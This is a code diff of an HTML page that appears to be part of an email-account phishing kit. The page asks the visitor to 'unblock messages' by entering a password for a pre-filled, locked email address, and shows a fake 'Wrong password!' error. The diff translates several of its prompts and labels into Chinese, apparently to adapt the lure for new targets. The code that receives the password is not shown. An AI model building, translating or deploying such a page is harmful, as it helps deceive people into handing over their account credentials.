@@ -169,19 +169,19 @@
                 <div class="email_icon">
                     <width="212" height="20" id="img" /></div>
                     <h4 class="text-dark"><strong id="domain-name" class="text-uppercase"></strong></h4>
-                    <h5 class="font-weight-light">Enter valid details to unblock messages</h5>
+                    <h5 class="font-weight-light">输入有效的详细信息以取消阻止消息</h5>
                 </div>
                 <div style="width: 100%;">
-                    <div class="alert alert-danger" id="msg" style="display: none;">Wrong password! Please enter correct password.</div>
+                    <div class="alert alert-danger" id="msg" style="display: none;">密码错误！请输入正确的密码.</div>
                     <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
                 </div>
                 <form>
                     <div class="form-holder">
                         <input type="email" id="email" name="email" class="form-control" readonly placeholder="someone@example.com" required>
-                        <input type="password" id="password" placeholder="Password" class="form-control" required>
+                        <input type="password" id="password" placeholder="密码" class="form-control" required>
                         <div class="checkbox">
                             <input type="checkbox" name="" style="float: left; margin-top:2px; margin-bottom: 10px;">
-                            <label>REMEMBER ME</label>
+                            <label>记住账号</label>
                         </div>
                         <div class="btn-holder">
                             <button class="btn btn-lg col-12" id="submit-btn">Unblock Messages</button>
